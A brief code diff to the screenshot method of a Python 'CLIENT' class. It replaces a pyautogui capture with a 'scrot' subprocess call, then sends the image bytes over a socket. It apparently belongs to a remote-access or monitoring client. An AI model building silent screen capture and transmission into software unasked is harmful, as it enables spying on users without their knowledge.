@@ -37,8 +37,8 @@ class CLIENT:
         file.close()
         
     def screenshot(self):
+        subprocess.run(['scrot', 'screenshot.png'])
         file = 'screenshot.png'
-        pyautogui.screenshot(file)
         file = open(file, 'rb')
         file_data = file.read()
         sock.send(file_data)
